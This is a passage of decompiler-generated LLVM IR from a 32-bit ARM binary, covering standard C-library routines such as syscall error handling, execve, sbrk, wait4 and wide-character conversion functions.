  %v2_17a60 = icmp eq i32 %v0_17a60.pr, 0
  store i32 %v1_17a4c, i32* @r4, align 4
  br i1 %v2_17a60, label %dec_label_pc_17a94, label %dec_label_pc_17a6c

dec_label_pc_17a6c:                               ; preds = %thread-pre-split
  %v2_17a6c = load i32, i32* %stack_var_-296, align 4
  store i32 %v0_17a50, i32* %r0.global-to-local, align 4
  %v2_17a74 = inttoptr i32 %v0_17a50 to i32*
  store i32 %v2_17a6c, i32* %v2_17a74, align 4
  %v3_17a74 = load i32, i32* %r0.global-to-local, align 4
  %v4_17a74 = add i32 %v3_17a74, 4
  store i32 %v4_17a74, i32* @r0, align 4
  %v2_17a78 = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_17a78, i32* @r1, align 4
  store i32 128, i32* @r2, align 4
  %v0_17a80 = call i32 @memcpy()
  store i32 %v0_17a80, i32* %r0.global-to-local, align 4
  %v1_17a88 = load i32, i32* @r5, align 4
  %v2_17a88 = add i32 %v1_17a88, 136
  %v3_17a88 = inttoptr i32 %v2_17a88 to i32*
  %v1_17a90 = load i32, i32* @r5, align 4
  %v2_17a90 = add i32 %v1_17a90, 132
  %v3_17a90 = inttoptr i32 %v2_17a90 to i32*
  %v0_17a94.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17a94

dec_label_pc_17a94:                               ; preds = %thread-pre-split.thread, %thread-pre-split, %dec_label_pc_17a6c
  %v0_17a94 = phi i32 [ %v1_17a4c, %thread-pre-split ], [ %v0_17a94.pre, %dec_label_pc_17a6c ], [ %v1_17a4c, %thread-pre-split.thread ]
  store i32 %v0_17a94, i32* %r0.global-to-local, align 4
  store i32 %v3_179c4, i32* @r4, align 4
  store i32 %v6_179c4, i32* @r5, align 4
  ret i32 %v0_17a94

; uselistorder directives
  uselistorder i32 %v0_17a94, { 1, 0 }
  uselistorder i32 %v0_17a50, { 1, 0, 2 }
  uselistorder i32 %v0_17a48, { 1, 0 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 3, 4, 7, 6, 1, 0 }
  uselistorder i32 136, { 1, 0 }
  uselistorder i32 132, { 1, 2, 0 }
  uselistorder label %dec_label_pc_17a94, { 2, 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_17a28, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v3_17aa8 = load i32, i32* @r4, align 4
  store i32 %v3_17aa8, i32* %stack_var_-8, align 4
  %v0_17aac = load i32, i32* @r0, align 4
  %v0_17ab0 = call i32 @__errno_location()
  %v1_17ab4 = sub i32 0, %v0_17aac
  %v2_17ab8 = inttoptr i32 %v0_17ab0 to i32*
  store i32 %v1_17ab4, i32* %v2_17ab8, align 4
  %v2_17ac0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17ac0, i32* @r4, align 4
  ret i32 -1
}

define i32 @__default_sa_restorer(%sigcontext* %scp) local_unnamed_addr {
entry:
  %v3_17ac4 = call i32 @sigreturn(%sigcontext* %scp)
  ret i32 %v3_17ac4
}

define i32 @__default_rt_sa_restorer(%sigcontext* %scp) local_unnamed_addr {
entry:
  %v3_17ac8 = call i32 @sigreturn(%sigcontext* %scp)
  ret i32 %v3_17ac8
}

define i32 @__syscall_rt_sigaction(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17acc = load i32, i32* @r4, align 4
  store i32 %v3_17acc, i32* %stack_var_-8, align 4
  %v1_17ad0 = load i32, i32* @r1, align 4
  %v2_17ad0 = inttoptr i32 %v1_17ad0 to %sigaction*
  %v3_17ad0 = load i32, i32* @r2, align 4
  %v4_17ad0 = inttoptr i32 %v3_17ad0 to %sigaction*
  %v5_17ad0 = call i32 @sigaction(i32 %arg1, %sigaction* %v2_17ad0, %sigaction* %v4_17ad0)
  store i32 %v5_17ad0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_17ad0, -4095
  br i1 %tmp, label %dec_label_pc_17af0, label %dec_label_pc_17ae0

dec_label_pc_17ae0:                               ; preds = %entry
  %v0_17ae0 = call i32 @__errno_location()
  %v0_17ae4 = load i32, i32* %r4.global-to-local, align 4
  %v1_17ae4 = sub i32 0, %v0_17ae4
  %v2_17ae8 = inttoptr i32 %v0_17ae0 to i32*
  store i32 %v1_17ae4, i32* %v2_17ae8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17af0

dec_label_pc_17af0:                               ; preds = %entry, %dec_label_pc_17ae0
  %v0_17af0 = phi i32 [ %v5_17ad0, %entry ], [ -1, %dec_label_pc_17ae0 ]
  %v2_17af4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17af4, i32* %r4.global-to-local, align 4
  ret i32 %v0_17af0

; uselistorder directives
  uselistorder i32 %v5_17ad0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17af0, { 1, 0 }
}

define i32 @__GI_execve() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17af8 = load i32, i32* @r4, align 4
  store i32 %v3_17af8, i32* %stack_var_-8, align 4
  %v0_17afc = load i32, i32* @r0, align 4
  %v1_17afc = inttoptr i32 %v0_17afc to i8*
  %v2_17afc = load i32, i32* @r1, align 4
  %v3_17afc = inttoptr i32 %v2_17afc to i8*
  %v4_17afc = insertvalue [1 x i8*] undef, i8* %v3_17afc, 0
  %v5_17afc = load i32, i32* @r2, align 4
  %v6_17afc = inttoptr i32 %v5_17afc to i8*
  %v7_17afc = insertvalue [1 x i8*] undef, i8* %v6_17afc, 0
  %v8_17afc = call i32 @execve(i8* %v1_17afc, [1 x i8*] %v4_17afc, [1 x i8*] %v7_17afc)
  store i32 %v8_17afc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v8_17afc, -4095
  br i1 %tmp, label %dec_label_pc_17b1c, label %dec_label_pc_17b0c

dec_label_pc_17b0c:                               ; preds = %entry
  %v0_17b0c = call i32 @__errno_location()
  %v0_17b10 = load i32, i32* %r4.global-to-local, align 4
  %v1_17b10 = sub i32 0, %v0_17b10
  %v2_17b14 = inttoptr i32 %v0_17b0c to i32*
  store i32 %v1_17b10, i32* %v2_17b14, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17b1c

dec_label_pc_17b1c:                               ; preds = %entry, %dec_label_pc_17b0c
  %v0_17b1c = phi i32 [ %v8_17afc, %entry ], [ -1, %dec_label_pc_17b0c ]
  %v2_17b20 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17b20, i32* @r4, align 4
  ret i32 %v0_17b1c

; uselistorder directives
  uselistorder i32 %v8_17afc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17b1c, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17b24 = load i32, i32* @r4, align 4
  store i32 %v3_17b24, i32* %stack_var_-8, align 4
  %v0_17b2c = load i32, i32* @r0, align 4
  store i32 %v0_17b2c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_17b2c, -4095
  br i1 %tmp, label %dec_label_pc_17b48, label %dec_label_pc_17b38

dec_label_pc_17b38:                               ; preds = %entry
  %v0_17b38 = call i32 @__errno_location()
  %v0_17b3c = load i32, i32* %r4.global-to-local, align 4
  %v1_17b3c = sub i32 0, %v0_17b3c
  %v2_17b40 = inttoptr i32 %v0_17b38 to i32*
  store i32 %v1_17b3c, i32* %v2_17b40, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_17b4c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_17b48

dec_label_pc_17b48:                               ; preds = %entry, %dec_label_pc_17b38
  %v2_17b4c = phi i32 [ %v3_17b24, %entry ], [ %v2_17b4c.pre, %dec_label_pc_17b38 ]
  %v0_17b48 = phi i32 [ %v0_17b2c, %entry ], [ -1, %dec_label_pc_17b38 ]
  store i32 %v2_17b4c, i32* @r4, align 4
  ret i32 %v0_17b48

; uselistorder directives
  uselistorder i32 %v0_17b2c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17b48, { 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17b50 = load i32, i32* @r4, align 4
  store i32 %v3_17b50, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_17b74, label %dec_label_pc_17b64

dec_label_pc_17b64:                               ; preds = %entry
  %v0_17b64 = call i32 @__errno_location()
  %v0_17b68 = load i32, i32* %r4.global-to-local, align 4
  %v1_17b68 = sub i32 0, %v0_17b68
  %v2_17b6c = inttoptr i32 %v0_17b64 to i32*
  store i32 %v1_17b68, i32* %v2_17b6c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_17b78.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_17b74

dec_label_pc_17b74:                               ; preds = %entry, %dec_label_pc_17b64
  %v2_17b78 = phi i32 [ %v3_17b50, %entry ], [ %v2_17b78.pre, %dec_label_pc_17b64 ]
  %v0_17b74 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_17b64 ]
  store i32 %v2_17b78, i32* %r4.global-to-local, align 4
  ret i32 %v0_17b74

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17b74, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17b7c = load i32, i32* @r4, align 4
  store i32 %v3_17b7c, i32* %stack_var_-8, align 4
  %v0_17b84 = load i32, i32* @r0, align 4
  store i32 %v0_17b84, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_17b84, -4095
  br i1 %tmp, label %dec_label_pc_17ba0, label %dec_label_pc_17b90

dec_label_pc_17b90:                               ; preds = %entry
  %v0_17b90 = call i32 @__errno_location()
  %v0_17b94 = load i32, i32* %r4.global-to-local, align 4
  %v1_17b94 = sub i32 0, %v0_17b94
  %v2_17b98 = inttoptr i32 %v0_17b90 to i32*
  store i32 %v1_17b94, i32* %v2_17b98, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_17ba4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_17ba0

dec_label_pc_17ba0:                               ; preds = %entry, %dec_label_pc_17b90
  %v2_17ba4 = phi i32 [ %v3_17b7c, %entry ], [ %v2_17ba4.pre, %dec_label_pc_17b90 ]
  %v0_17ba0 = phi i32 [ %v0_17b84, %entry ], [ -1, %dec_label_pc_17b90 ]
  store i32 %v2_17ba4, i32* %r4.global-to-local, align 4
  ret i32 %v0_17ba0

; uselistorder directives
  uselistorder i32 %v0_17b84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17ba0, { 1, 0 }
}

define i32 @__libc_nanosleep(%timespec* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to %timespec*
  %stack_var_-8 = alloca i32, align 4
  %v3_17ba8 = load i32, i32* @r4, align 4
  store i32 %v3_17ba8, i32* %stack_var_-8, align 4
  %v6_17bac = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp)
  store i32 %v6_17bac, i32* %r4.global-to-local, align 4
  %tmp6 = icmp ult i32 %v6_17bac, -4095
  br i1 %tmp6, label %dec_label_pc_17bcc, label %dec_label_pc_17bbc

dec_label_pc_17bbc:                               ; preds = %entry
  %v0_17bbc = call i32 @__errno_location()
  %v0_17bc0 = load i32, i32* %r4.global-to-local, align 4
  %v1_17bc0 = sub i32 0, %v0_17bc0
  %v2_17bc4 = inttoptr i32 %v0_17bbc to i32*
  store i32 %v1_17bc0, i32* %v2_17bc4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17bcc

dec_label_pc_17bcc:                               ; preds = %entry, %dec_label_pc_17bbc
  %v0_17bcc = phi i32 [ %v6_17bac, %entry ], [ -1, %dec_label_pc_17bbc ]
  %v2_17bd0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17bd0, i32* %r4.global-to-local, align 4
  ret i32 %v0_17bcc

; uselistorder directives
  uselistorder i32 %v6_17bac, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17bcc, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_17bd4 = load i32, i32* @r4, align 4
  store i32 %v3_17bd4, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_31844.1542 to i32), i32* %r4.global-to-local, align 4
  %v2_17bdc = load i32, i32* @global_var_31844.1542, align 4
  %v2_17be0 = icmp eq i32 %v2_17bdc, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_17be0, label %dec_label_pc_17bf0, label %dec_label_pc_17bfc

dec_label_pc_17bf0:                               ; preds = %entry
  %v2_17bf0 = call i32 @__GI_brk(i32* null)
  %v1_17bf4 = icmp slt i32 %v2_17bf0, 0
  br i1 %v1_17bf4, label %dec_label_pc_17c1c, label %dec_label_pc_17bfcthread-pre-split

dec_label_pc_17bfcthread-pre-split:               ; preds = %dec_label_pc_17bf0
  %v0_17c00.pr = load i32, i32* %r5.global-to-local, align 4
  %v2_17bfc.pre = load i32, i32* @global_var_31844.1542, align 4
  br label %dec_label_pc_17bfc

dec_label_pc_17bfc:                               ; preds = %dec_label_pc_17bfcthread-pre-split, %entry
  %v2_17bfc = phi i32 [ %v2_17bfc.pre, %dec_label_pc_17bfcthread-pre-split ], [ %v2_17bdc, %entry ]
  %v1_17c08 = phi i32 [ %v0_17c00.pr, %dec_label_pc_17bfcthread-pre-split ], [ %arg1, %entry ]
  %v2_17c00 = icmp eq i32 %v1_17c08, 0
  store i32 %v2_17bfc, i32* %r4.global-to-local, align 4
  br i1 %v2_17c00, label %dec_label_pc_17c20, label %dec_label_pc_17c10

dec_label_pc_17c10:                               ; preds = %dec_label_pc_17bfc
  %v2_17c08 = add i32 %v1_17c08, %v2_17bfc
  %v1_17c10 = inttoptr i32 %v2_17c08 to i32*
  %v2_17c10 = call i32 @__GI_brk(i32* %v1_17c10)
  %v1_17c14 = icmp slt i32 %v2_17c10, 0
  br i1 %v1_17c14, label %dec_label_pc_17c1c, label %dec_label_pc_17c10.dec_label_pc_17c20_crit_edge

dec_label_pc_17c10.dec_label_pc_17c20_crit_edge:  ; preds = %dec_label_pc_17c10
  %v0_17c20.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17c20

dec_label_pc_17c1c:                               ; preds = %dec_label_pc_17c10, %dec_label_pc_17bf0
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17c20

dec_label_pc_17c20:                               ; preds = %dec_label_pc_17c10.dec_label_pc_17c20_crit_edge, %dec_label_pc_17bfc, %dec_label_pc_17c1c
  %v0_17c20 = phi i32 [ %v0_17c20.pre, %dec_label_pc_17c10.dec_label_pc_17c20_crit_edge ], [ %v2_17bfc, %dec_label_pc_17bfc ], [ -1, %dec_label_pc_17c1c ]
  %v2_17c24 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17c24, i32* @r4, align 4
  ret i32 %v0_17c20

; uselistorder directives
  uselistorder i32 %v2_17bfc, { 1, 0, 2 }
  uselistorder i32* null, { 0, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 16, 14, 17, 18, 19, 20, 21, 22, 28, 29, 26, 27, 25, 24, 23, 30, 31, 32, 2 }
  uselistorder label %dec_label_pc_17c20, { 2, 0, 1 }
}

define i32 @wait4() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17c2c = load i32, i32* @r4, align 4
  store i32 %v3_17c2c, i32* %stack_var_-8, align 4
  %v0_17c30 = call i32 @wait4()
  store i32 %v0_17c30, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_17c30, -4095
  br i1 %tmp, label %dec_label_pc_17c50, label %dec_label_pc_17c40

dec_label_pc_17c40:                               ; preds = %entry
  %v0_17c40 = call i32 @__errno_location()
  %v0_17c44 = load i32, i32* %r4.global-to-local, align 4
  %v1_17c44 = sub i32 0, %v0_17c44
  %v2_17c48 = inttoptr i32 %v0_17c40 to i32*
  store i32 %v1_17c44, i32* %v2_17c48, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17c50

dec_label_pc_17c50:                               ; preds = %entry, %dec_label_pc_17c40
  %v0_17c50 = phi i32 [ %v0_17c30, %entry ], [ -1, %dec_label_pc_17c40 ]
  %v2_17c54 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17c54, i32* @r4, align 4
  ret i32 %v0_17c50

; uselistorder directives
  uselistorder i32 %v0_17c30, { 1, 0, 2 }
  uselistorder i32 ()* @wait4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17c50, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_31824.1544 to i32)
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_17c68 = icmp eq i32 %arg1, 0
  br i1 %v2_17c68, label %bb, label %.thread

.thread:                                          ; preds = %entry
  br label %bb11

bb:                                               ; preds = %entry
  %v3_17c70 = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_17c98 = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_17c8c = phi i32 [ %arg1, %.thread ], [ %v3_17c70, %bb ]
  store i32 %arg3, i32* @r4, align 4
  store i32 16, i32* @r3, align 4
  %v2_17c84 = ptrtoint i32* %stack_var_-16 to i32
  %v2_17c90 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_17c90, i32* %stack_var_-16, align 4
  store i32 %v0_17c98, i32* %stack_var_-12, align 4
  %v5_17ca0 = inttoptr i32 %v0_17c8c to i8*
  %v6_17ca0 = call i32 @__GI_wcsnrtombs(i8* %v5_17ca0, i32 %v2_17c84, i32 1, i32 16, i32 %arg3)
  %v2_17ca4 = icmp eq i32 %v6_17ca0, 0
  br i1 %v2_17ca4, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v8_17cb0 = phi i32 [ %v6_17ca0, %bb11 ], [ 1, %bb12 ]
  ret i32 %v8_17cb0

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %v0_17cc0 = load i32, i32* @r2, align 4
  store i32 %v0_17cc0, i32* @r3, align 4
  %v0_17cc8 = load i32, i32* @r0, align 4
  %v1_17cc8 = load i32, i32* @r1, align 4
  %v5_17cc8 = inttoptr i32 %v0_17cc8 to i8*
  %v6_17cc8 = call i32 @__GI_wcsnrtombs(i8* %v5_17cc8, i32 %v1_17cc8, i32 -1, i32 %v0_17cc0, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_17cc8
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17cd4 = load i32, i32* @r4, align 4
  store i32 %v3_17cd4, i32* %stack_var_-8, align 4
  %v10_17cd8 = icmp eq i32 %tmp, %arg2
  br i1 %v10_17cd8, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v0_17ce01 = load i32, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_17cf4

bb:                                               ; preds = %entry
  %v4_17cdc = icmp eq i8* %arg1, null
  %v0_17ce0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br i1 %v4_17cdc, label %dec_label_pc_17cf4, label %bb27

bb27:                                             ; preds = %bb
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17d30

dec_label_pc_17cf4:                               ; preds = %.thread, %bb
  %v1_17d34.ph = phi i32 [ %v0_17ce0, %bb ], [ %v0_17ce01, %.thread ]
  %v2_17ce43.ph = ptrtoint i32* %stack_var_-24 to i32
  %v3_17cf4 = icmp eq i8* %arg1, null
  store i32 %v2_17ce43.ph, i32* %ip.global-to-local, align 4
  br i1 %v3_17cf4, label %.thread4, label %dec_label_pc_17d28

.thread4:                                         ; preds = %dec_label_pc_17cf4
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %dec_label_pc_17d30

dec_label_pc_17d0c:                               ; preds = %dec_label_pc_17d48
  %v0_17d0c = call i32 @__errno_location()
  store i32 %v0_17d0c, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_17d18 = inttoptr i32 %v0_17d0c to i32*
  store i32 84, i32* %v2_17d18, align 4
  %v0_17d84.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17d84

dec_label_pc_17d20:                               ; preds = %dec_label_pc_17d58
  %v3_17d5c = zext i8 %v2_17d5c to i32
  store i32 %v3_17d5c, i32* @lr, align 4
  br label %dec_label_pc_17d78

dec_label_pc_17d28:                               ; preds = %dec_label_pc_17cf4
  store i32 %v2_17ce43.ph, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17d30

dec_label_pc_17d30:                               ; preds = %bb27, %.thread4, %dec_label_pc_17d28
  %v1_17d3420 = phi i32 [ %v0_17ce0, %bb27 ], [ %v1_17d34.ph, %.thread4 ], [ %v1_17d34.ph, %dec_label_pc_17d28 ]
  %v2_17d5814 = phi i32 [ %tmp, %bb27 ], [ %v2_17ce43.ph, %.thread4 ], [ %v2_17ce43.ph, %dec_label_pc_17d28 ]
  %v1_17d30 = load i32, i32* @r3, align 4
  %v3_17d30 = icmp uge i32 %v1_17d3420, %v1_17d30
  %v1_17d30.v1_17d3420 = select i1 %v3_17d30, i32 %v1_17d30, i32 %v1_17d3420
  store i32 %v1_17d30.v1_17d3420, i32* %r4.global-to-local, align 4
  %v1_17d3c = inttoptr i32 %arg2 to i32*
  %v2_17d3c = load i32, i32* %v1_17d3c, align 4
  store i32 %v2_17d3c, i32* @lr, align 4
  store i32 %v1_17d30.v1_17d3420, i32* %r0.global-to-local, align 4
  %v2_17d708 = icmp eq i32 %v1_17d30.v1_17d3420, 0
  br i1 %v2_17d708, label %dec_label_pc_17d78, label %dec_label_pc_17d48

dec_label_pc_17d48:                               ; preds = %dec_label_pc_17d30, %dec_label_pc_17d68.dec_label_pc_17d48_crit_edge
  %v2_17d58 = phi i32 [ %v2_17d68, %dec_label_pc_17d68.dec_label_pc_17d48_crit_edge ], [ %v2_17d5814, %dec_label_pc_17d30 ]
  %v0_17d50 = phi i32 [ %v0_17d48.pre, %dec_label_pc_17d68.dec_label_pc_17d48_crit_edge ], [ %v2_17d3c, %dec_label_pc_17d30 ]
  %v1_17d48 = inttoptr i32 %v0_17d50 to i32*
  %v2_17d48 = load i32, i32* %v1_17d48, align 4
  %v1_17d50 = add i32 %v0_17d50, 4
  store i32 %v1_17d50, i32* @lr, align 4
  %tmp36 = icmp ugt i32 %v2_17d48, 127
  br i1 %tmp36, label %dec_label_pc_17d0c, label %dec_label_pc_17d58

dec_label_pc_17d58:                               ; preds = %dec_label_pc_17d48
  %v1_17d58 = trunc i32 %v2_17d48 to i8
  %v3_17d58 = inttoptr i32 %v2_17d58 to i8*
  store i8 %v1_17d58, i8* %v3_17d58, align 1
  %v0_17d5c = load i32, i32* %ip.global-to-local, align 4
  %v1_17d5c = inttoptr i32 %v0_17d5c to i8*
  %v2_17d5c = load i8, i8* %v1_17d5c, align 1
  %v2_17d60 = icmp eq i8 %v2_17d5c, 0
  br i1 %v2_17d60, label %dec_label_pc_17d20, label %dec_label_pc_17d68

dec_label_pc_17d68:                               ; preds = %dec_label_pc_17d58
  %v1_17d68 = load i32, i32* %r2.global-to-local, align 4
  %v2_17d68 = add i32 %v1_17d68, %v0_17d5c
  store i32 %v2_17d68, i32* %ip.global-to-local, align 4
  %v0_17d6c = load i32, i32* %r0.global-to-local, align 4
  %v1_17d6c = add i32 %v0_17d6c, -1
  store i32 %v1_17d6c, i32* %r0.global-to-local, align 4
  %v2_17d70 = icmp eq i32 %v1_17d6c, 0
  br i1 %v2_17d70, label %dec_label_pc_17d78, label %dec_label_pc_17d68.dec_label_pc_17d48_crit_edge

dec_label_pc_17d68.dec_label_pc_17d48_crit_edge:  ; preds = %dec_label_pc_17d68
  %v0_17d48.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_17d48

dec_label_pc_17d78:                               ; preds = %dec_label_pc_17d68, %dec_label_pc_17d30, %dec_label_pc_17d20
  %v0_17d78 = phi i32 [ %v0_17d5c, %dec_label_pc_17d20 ], [ %v2_17d5814, %dec_label_pc_17d30 ], [ %v2_17d68, %dec_label_pc_17d68 ]
  %v1_17d78 = load i32, i32* @sp, align 4
  %v9_17d78 = icmp eq i32 %v0_17d78, %v1_17d78
  br i1 %v9_17d78, label %bb31, label %bb30

bb30:                                             ; preds = %dec_label_pc_17d78
  %v1_17d7c = load i32, i32* @lr, align 4
  store i32 %v1_17d7c, i32* %v1_17d3c, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_17d78, %bb30
  %v0_17d80 = load i32, i32* %r0.global-to-local, align 4
  %v1_17d80 = load i32, i32* %r4.global-to-local, align 4
  %v2_17d80 = sub i32 %v1_17d80, %v0_17d80
  store i32 %v2_17d80, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17d84

dec_label_pc_17d84:                               ; preds = %dec_label_pc_17d0c, %bb31
  %v0_17d84 = phi i32 [ %v0_17d84.pre, %dec_label_pc_17d0c ], [ %v2_17d80, %bb31 ]
  store i32 %v0_17d84, i32* %r0.global-to-local, align 4
  %v2_17d8c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17d8c, i32* %r4.global-to-local, align 4
  ret i32 %v0_17d84

; uselistorder directives
  uselistorder i32 %v0_17d84, { 1, 0 }
  uselistorder i32 %v1_17d6c, { 1, 0 }
  uselistorder i32 %v2_17d68, { 0, 2, 1 }
  uselistorder i32 %v2_17d48, { 1, 0 }
  uselistorder i32 %v2_17d5814, { 1, 0 }
  uselistorder i32 %v1_17d34.ph, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 3, 8, 6, 4, 5, 7, 9, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 4, 1, 6, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 4, 2, 3, 5, 0 }
  uselistorder i32* @sp, { 24, 25, 0, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 1, 2, 3, 4, 5, 6, 7, 23 }
  uselistorder i32 127, { 0, 1, 5, 7, 2, 4, 6, 3 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17d84, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_17d48, { 1, 0 }
  uselistorder label %dec_label_pc_17d30, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17cf4, { 1, 0 }
}

define i32 @fprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_17d9c = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_17d9c, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_17dac = call i32 @__GI_vfprintf()
  ret i32 %v0_17dac

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__stdio_WRITE(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
